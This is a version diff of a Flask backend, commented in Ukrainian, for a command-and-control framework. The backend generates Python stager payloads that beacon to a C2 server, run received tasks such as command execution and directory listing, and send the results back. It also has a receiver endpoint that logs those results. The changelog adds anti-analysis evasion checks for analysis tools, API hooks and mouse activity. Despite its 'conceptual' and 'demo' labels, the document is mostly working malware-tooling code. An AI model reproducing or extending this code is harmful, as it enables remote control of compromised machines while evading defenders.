@@ -1,9 +1,11 @@
-# Syntax Flask Backend - Segment SFB-CORE-1.7.6
-# Призначення: Backend на Flask з реалізацією виконання базових завдань у C2-стейджері.
-# Оновлення v1.7.6:
-#   - Оновлено логіку стейджера demo_c2_beacon_payload для фактичного виконання команд (listdir, exec_command).
-#   - Результати виконання команд повертаються на C2-сервер у наступному маячку.
-#   - Оновлено /api/c2/beacon_receiver для логування отриманих результатів завдань.
+# Syntax Flask Backend - Segment SFB-CORE-1.7.7
+# Призначення: Backend на Flask з розширеними концептуальними техніками ухилення в стейджерах.
+# Оновлення v1.7.7:
+#   - Розширено функцію ec_runtime (evasion checks) у генерованих стейджерах:
+#     - Додано концептуальну перевірку на процеси аналітичних інструментів.
+#     - Додано концептуальну перевірку на хукінг API (Windows).
+#     - Додано концептуальну перевірку активності миші (Windows).
+#   - Оновлено логування для нових технік ухилення.
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -23,12 +25,12 @@ import tempfile
 import os 
 import uuid 
 
-VERSION_BACKEND = "1.7.6"
+VERSION_BACKEND = "1.7.7"
 
 simulated_implants_be = []
 pending_tasks_for_implants = {} 
 
-CONCEPTUAL_CVE_DATABASE_BE = { # Логіка (без змін від v1.7.5)
+CONCEPTUAL_CVE_DATABASE_BE = { # Логіка (без змін від v1.7.6)
     "apache httpd 2.4.53": [{"cve_id": "CVE-2022-22721", "severity": "HIGH", "summary": "Apache HTTP Server 2.4.53 and earlier may not send the X-Frame-Options header..."}],
     "openssh 8.2p1": [{"cve_id": "CVE-2021-41617", "severity": "MEDIUM", "summary": "sshd in OpenSSH 6.2 through 8.8 allows remote attackers to bypass..."}],
     "vsftpd 3.0.3": [{"cve_id": "CVE-2015-1419", "severity": "CRITICAL", "summary": "vsftpd 3.0.3 and earlier allows remote attackers to cause a denial of service..."}],
@@ -61,7 +63,7 @@ def initialize_simulated_implants_be(): # Логіка (без змін)
     simulated_implants_be.sort(key=lambda x: x["id"])
     print(f"[C2_SIM_INFO] Ініціалізовано/Оновлено {len(simulated_implants_be)} імітованих імплантів. Чергу завдань очищено.")
 
-CONCEPTUAL_PARAMS_SCHEMA_BE = { # Логіка (без змін від v1.7.5)
+CONCEPTUAL_PARAMS_SCHEMA_BE = { # Логіка (без змін від v1.7.6)
     "payload_archetype": {
         "type": str, "required": True,
         "allowed_values": [
@@ -129,7 +131,7 @@ CONCEPTUAL_PARAMS_SCHEMA_BE = { # Логіка (без змін від v1.7.5)
     "enable_stager_metamorphism": {"type": bool, "required": False, "default": True},
     "enable_evasion_checks": {"type": bool, "required": False, "default": True}
 }
-CONCEPTUAL_ARCHETYPE_TEMPLATES_BE = { # Логіка (без змін від v1.7.5)
+CONCEPTUAL_ARCHETYPE_TEMPLATES_BE = { # Логіка (без змін від v1.7.6)
     "demo_echo_payload": {"description": "Демо-пейлоад, що друкує повідомлення...", "template_type": "python_stager_echo"},
     "demo_file_lister_payload": {"description": "Демо-пейлоад, що 'перелічує' файли...", "template_type": "python_stager_file_lister"},
     "demo_c2_beacon_payload": {"description": "Демо-пейлоад C2-маячка (HTTP POST з виконанням завдань)", "template_type": "python_stager_http_c2_beacon"},
@@ -808,7 +810,7 @@ def handle_generate_payload():
             "                if next_task and next_task.get('task_type'):",
             "                    task_id = next_task.get('task_id')",
             "                    task_type = next_task.get('task_type')",
-            "                    task_params_str = next_task.get('task_params', '')", # Параметри завжди рядок
+            "                    task_params_str = next_task.get('task_params', '')", 
             "                    print(f\"[PAYLOAD_TASK] Отримано завдання ID: {{task_id}}, Тип: {{task_type}}, Парам: '{{task_params_str}}'\")",
             "                    task_output = ''",
             "                    task_success = False",
@@ -847,7 +849,7 @@ def handle_generate_payload():
             "            except socket.timeout:",
             "                print(f\"[PAYLOAD_BEACON_ERROR] Таймаут під час відправки маячка. Повторна спроба через {{BEACON_INTERVAL_SEC}} сек.\")",
             "            except json_module.JSONDecodeError as e_json:",
-            "                response_data_raw_local = response_data_raw if 'response_data_raw' in locals() else 'N/A'", # Забезпечуємо наявність змінної
+            "                response_data_raw_local = response_data_raw if 'response_data_raw' in locals() else 'N/A'", 
             "                print(f\"[PAYLOAD_BEACON_ERROR] Помилка декодування JSON відповіді від C2: {{e_json}}. Відповідь: {{response_data_raw_local}}\")",
             "            except Exception as e_beacon_loop:",
             "                print(f\"[PAYLOAD_BEACON_ERROR] Загальна помилка в циклі маячка: {{e_beacon_loop}}. Повторна спроба через {{BEACON_INTERVAL_SEC}} сек.\")",
@@ -1068,7 +1070,7 @@ def handle_run_recon():
         log_messages.append(f"[BACKEND_FATAL_ERROR] {str(e)}")
         return jsonify({"success": False, "error": "Server error during recon", "reconLog": "\n".join(log_messages)}), 500
 
-@app.route('/api/c2/beacon_receiver', methods=['POST'])
+@app.route('/api/c2/beacon_receiver', methods=['POST']) # Логіка (без змін)
 def handle_c2_beacon():
     log_messages_c2_beacon = [f"[C2_BEACON_RECEIVER v{VERSION_BACKEND}] Запит о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}."]
     global pending_tasks_for_implants, simulated_implants_be
@@ -1082,7 +1084,6 @@ def handle_c2_beacon():
         hostname_from_beacon = beacon_data.get("hostname", "N/A")
         log_messages_c2_beacon.append(f"[C2_BEACON_RECEIVED] Отримано маячок від ID: {implant_id_from_beacon}, Hostname: {hostname_from_beacon}")
         
-        # Логування результату попереднього завдання, якщо є
         last_task_id_received = beacon_data.get("last_task_id")
         last_task_result_received = beacon_data.get("last_task_result")
         if last_task_id_received:
@@ -1095,7 +1096,7 @@ def handle_c2_beacon():
         for implant in simulated_implants_be:
             if implant["id"] == implant_id_from_beacon:
                 implant["lastSeen"] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-                implant["status"] = "active_beaconing" # Оновлюємо статус на активний
+                implant["status"] = "active_beaconing" 
                 implant_found_in_list = True
                 log_messages_c2_beacon.append(f"[C2_BEACON_UPDATE] Оновлено lastSeen та статус для імпланта {implant_id_from_beacon}.")
                 break
